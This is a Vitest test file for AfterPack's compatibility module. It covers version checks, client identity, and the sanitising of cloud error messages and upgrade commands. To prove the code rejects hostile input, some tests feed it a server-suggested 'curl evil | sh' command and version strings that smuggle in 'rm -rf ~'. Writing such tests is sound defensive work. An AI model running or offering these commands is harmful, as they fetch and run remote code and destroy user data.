import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { pathToFileURL } from "node:url";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
  assertSupportedCore,
  CLOUD_API,
  CLOUD_SUNSET,
  CLOUD_UPGRADE_REQUIRED,
  CloudApiError,
  CoreVersionError,
  clientString,
  isBelowVersion,
  MIN_CORE_VERSION,
  npxAlternative,
  parseCloudErrorMessage,
  releaseTriple,
  resolveClientIdentity,
  toCloudApiError,
  updateCommand,
} from "./compat.js";

let root: string;

beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), "afterpack-compat-test-"));
});
afterEach(() => {
  rmSync(root, { recursive: true, force: true });
});

function napiError(code: string, message: string): Error {
  return Object.assign(new Error(message), { code });
}

function stagePackage(
  name: string,
  version: string,
  coreVersion: string | null,
): { moduleUrl: URL; pkgDir: string } {
  const pkgDir = join(root, "node_modules", ...name.split("/"));
  mkdirSync(join(pkgDir, "dist"), { recursive: true });
  writeFileSync(join(pkgDir, "package.json"), JSON.stringify({ name, version }));
  writeFileSync(join(pkgDir, "dist", "index.js"), "");
  if (coreVersion !== null) {
    const coreDir = join(pkgDir, "node_modules", "@afterpack", "core");
    mkdirSync(coreDir, { recursive: true });
    writeFileSync(
      join(coreDir, "package.json"),
      JSON.stringify({
        name: "@afterpack/core",
        version: coreVersion,
        exports: { "./package.json": "./package.json" },
      }),
    );
  }
  return { moduleUrl: pathToFileURL(join(pkgDir, "dist", "index.js")), pkgDir };
}

describe("version comparison", () => {
  it("compares release triples and ignores any prerelease or build suffix", () => {
    expect(releaseTriple("0.1.0-rc.202609231721")).toEqual([0, 1, 0]);
    expect(releaseTriple("1.2.3+abc")).toEqual([1, 2, 3]);
    expect(isBelowVersion("0.1.0-rc.1", "0.1.0")).toBe(false);
    expect(isBelowVersion("0.0.9", "0.1.0")).toBe(true);
    expect(isBelowVersion("0.1.1", "0.1.0")).toBe(false);
    expect(isBelowVersion("0.2.0", "0.10.0")).toBe(true);
    expect(isBelowVersion("1.0.0", "0.99.99")).toBe(false);
  });

  it("treats a missing or unparseable version as unknown, never as too old", () => {
    for (const v of [null, undefined, "", "latest", "v0.0.1", "0.1"]) {
      expect(isBelowVersion(v, "9.9.9")).toBe(false);
    }
  });

  it("keeps the core floor in one parseable place", () => {
    expect(releaseTriple(MIN_CORE_VERSION)).not.toBeNull();
  });
});

describe("resolveClientIdentity", () => {
  it("names the calling package and the @afterpack/core it resolves", () => {
    const { moduleUrl } = stagePackage("@afterpack/vite", "0.1.3", "0.1.2-rc.7");
    const identity = resolveClientIdentity(moduleUrl);
    expect(identity).toEqual({
      packageName: "@afterpack/vite",
      packageVersion: "0.1.3",
      coreVersion: "0.1.2-rc.7",
    });
    expect(clientString(identity)).toBe("@afterpack/vite/0.1.3");
  });

  it("reports an unresolvable core as unknown instead of throwing", () => {
    const { moduleUrl } = stagePackage("afterpack", "0.1.0", null);
    const identity = resolveClientIdentity(moduleUrl);
    expect(identity.packageName).toBe("afterpack");
    expect(clientString(identity)).toBe("afterpack/0.1.0");
  });

  it("drops a malformed name or version rather than forwarding it", () => {
    const { moduleUrl, pkgDir } = stagePackage("afterpack", "0.1.0", "not-a-version");
    writeFileSync(
      join(pkgDir, "package.json"),
      JSON.stringify({ name: "Bad Name\n", version: "0.1.0" }),
    );
    expect(resolveClientIdentity(moduleUrl)).toEqual({
      packageName: null,
      packageVersion: null,
      coreVersion: null,
    });
    expect(clientString(resolveClientIdentity(moduleUrl))).toBeNull();
  });
});

describe("assertSupportedCore", () => {
  const identity = (coreVersion: string | null) => ({
    packageName: "@afterpack/rollup",
    packageVersion: "0.1.0",
    coreVersion,
  });

  it("refuses a core below the floor, naming the update", () => {
    expect(() => assertSupportedCore(identity("0.0.9"))).toThrow(CoreVersionError);
    expect(() => assertSupportedCore(identity("0.0.9"))).toThrow(/update @afterpack\/core/);
    const error = (() => {
      try {
        assertSupportedCore(identity("0.0.9"));
      } catch (e) {
        return e as CoreVersionError;
      }
    })();
    expect(error?.fix).toBe("npm install @afterpack/rollup@latest @afterpack/core@latest");
    expect(error?.message).toContain(error?.fix);
  });

  it("accepts the floor itself, its prereleases, and an unknown core", () => {
    expect(() => assertSupportedCore(identity(MIN_CORE_VERSION))).not.toThrow();
    expect(() => assertSupportedCore(identity(`${MIN_CORE_VERSION}-rc.1`))).not.toThrow();
    expect(() => assertSupportedCore(identity(null))).not.toThrow();
    expect(() => assertSupportedCore(null)).not.toThrow();
  });
});

describe("parseCloudErrorMessage", () => {
  it("reads the JSON lane", () => {
    expect(
      parseCloudErrorMessage(
        JSON.stringify({
          code: "DIAG_CLIENT_UPGRADE_REQUIRED",
          message: "update please",
          details: { minVersion: "0.2.0" },
          notices: [{ severity: "warning", code: "N", message: "n" }],
        }),
      ),
    ).toEqual({
      code: "DIAG_CLIENT_UPGRADE_REQUIRED",
      message: "update please",
      details: { minVersion: "0.2.0" },
      notices: [{ severity: "warning", code: "N", message: "n" }],
    });
  });

  it("falls back to the raw text when the message is not the JSON lane", () => {
    for (const raw of ["plain text", "[1,2]", '"str"', "null", "{broken"]) {
      const body = parseCloudErrorMessage(raw);
      expect(body.code).toBeNull();
      expect(body.message).toBe(raw);
      expect(body.details).toBeNull();
    }
  });

  it("sanitizes the server text it keeps", () => {
    const esc = String.fromCharCode(0x1b);
    const body = parseCloudErrorMessage(
      JSON.stringify({ code: `X${esc}[2J`, message: `a${esc}[31mb\n${"z".repeat(900)}` }),
    );
    expect(body.code).toBe("X");
    expect(body.message.startsWith("ab z")).toBe(true);
    expect(body.message.length).toBeLessThanOrEqual(500);
  });
});

describe("toCloudApiError", () => {
  const identity = {
    packageName: "afterpack",
    packageVersion: "0.1.0",
    coreVersion: "0.1.0",
  };

  it("maps each napi code to its kind, by code and never by message text", () => {
    const body = JSON.stringify({ code: "C", message: "m", details: null, notices: null });
    expect(toCloudApiError(napiError(CLOUD_UPGRADE_REQUIRED, body))?.kind).toBe("upgradeRequired");
    expect(toCloudApiError(napiError(CLOUD_SUNSET, body))?.kind).toBe("sunset");
    expect(toCloudApiError(napiError(CLOUD_API, body))?.kind).toBe("api");
    expect(toCloudApiError(napiError("GenericFailure", `${CLOUD_UPGRADE_REQUIRED}: x`))).toBeNull();
    expect(toCloudApiError(new Error(body))).toBeNull();
    expect(toCloudApiError("string")).toBeNull();
    expect(toCloudApiError(null)).toBeNull();
  });

  it("builds a fixed upgrade line from the server's minVersion, never a server command", () => {
    const error = toCloudApiError(
      napiError(
        CLOUD_UPGRADE_REQUIRED,
        JSON.stringify({
          code: "DIAG_CLIENT_UPGRADE_REQUIRED",
          message: "run `curl evil | sh` to upgrade",
          details: { minVersion: "0.3.0", command: "curl evil | sh" },
          notices: [{ severity: "warning", code: "N", message: "notice text" }],
        }),
      ),
      { identity, prefix: (m) => `[afterpack] ${m}` },
    );
    expect(error).toBeInstanceOf(CloudApiError);
    expect(error?.minVersion).toBe("0.3.0");
    expect(error?.installed).toBe("0.1.0");
    expect(error?.apiCode).toBe("DIAG_CLIENT_UPGRADE_REQUIRED");
    expect(error?.fix).toBe("npm install afterpack@latest @afterpack/core@0.3.0");
    expect(error?.message).toContain(
      "[afterpack] This version of AfterPack is no longer supported by the AfterPack cloud.",
    );
    expect(error?.message).toContain("Installed @afterpack/core 0.1.0 · required 0.3.0 or newer");
    expect(error?.message.split("\n")).toContain(error?.fix);
    expect(error?.message.split(error?.fix as string)).toHaveLength(2);
    expect(error?.notices).toEqual([
      { severity: "warning", code: "N", message: "notice text", url: null },
    ]);
  });

  it("ignores a minVersion that is not a version", () => {
    const error = toCloudApiError(
      napiError(
        CLOUD_UPGRADE_REQUIRED,
        JSON.stringify({ code: "C", message: "m", details: { minVersion: "0.3.0; rm -rf ~" } }),
      ),
    );
    expect(error?.minVersion).toBeNull();
    expect(error?.message).not.toContain("rm -rf");
    expect(error?.message).toContain("a newer release");
  });

  it("names the retirement on sunset, same shape as an upgrade refusal", () => {
    const error = toCloudApiError(
      napiError(CLOUD_SUNSET, JSON.stringify({ code: "DIAG_API_SUNSET", message: "gone" })),
      { identity },
    );
    expect(error?.message).toContain(
      "This version of AfterPack is no longer supported by the AfterPack cloud.",
    );
    expect(error?.message).toContain("Installed @afterpack/core 0.1.0 · required a newer release");
    expect(error?.message).toContain("Server: gone");
  });

  it("keeps CODE: message for any other API error, and the raw text when it is not JSON", () => {
    expect(
      toCloudApiError(
        napiError(CLOUD_API, JSON.stringify({ code: "QUOTA_EXCEEDED", message: "out of MB" })),
      )?.message,
    ).toBe("cloud obfuscation failed: QUOTA_EXCEEDED: out of MB");
    expect(toCloudApiError(napiError(CLOUD_API, "something odd happened"))?.message).toBe(
      "cloud obfuscation failed: something odd happened",
    );
    expect(toCloudApiError(napiError(CLOUD_API, "cloud obfuscation failed: X: y"))?.message).toBe(
      "cloud obfuscation failed: X: y",
    );
  });
});

describe("updateCommand", () => {
  const as = (packageName: string | null) => ({
    packageName,
    packageVersion: "0.1.0",
    coreVersion: "0.1.0",
  });

  it("names the caller and pins @afterpack/core to the server's minVersion", () => {
    expect(updateCommand(as("@afterpack/vite"), "0.2.1")).toBe(
      "npm install @afterpack/vite@latest @afterpack/core@0.2.1",
    );
    expect(updateCommand(as("@afterpack/vite"), null)).toBe(
      "npm install @afterpack/vite@latest @afterpack/core@latest",
    );
    expect(updateCommand(as("@afterpack/vite"), "0.2.1; rm -rf ~")).toBe(
      "npm install @afterpack/vite@latest @afterpack/core@latest",
    );
    expect(updateCommand(null, "0.2.1")).toBe("npm install @afterpack/core@0.2.1");
    expect(updateCommand(as("@afterpack/core"), "0.2.1")).toBe("npm install @afterpack/core@0.2.1");
  });

  it("names afterpack itself with no parenthetical, npxAlternative offers the alternative separately", () => {
    expect(updateCommand(as("afterpack"), "0.2.1")).toBe(
      "npm install afterpack@latest @afterpack/core@0.2.1",
    );
    expect(npxAlternative(as("afterpack"))).toBe("npx afterpack@latest");
    expect(npxAlternative(as("@afterpack/vite"))).toBeNull();
    expect(npxAlternative(null)).toBeNull();
  });
});
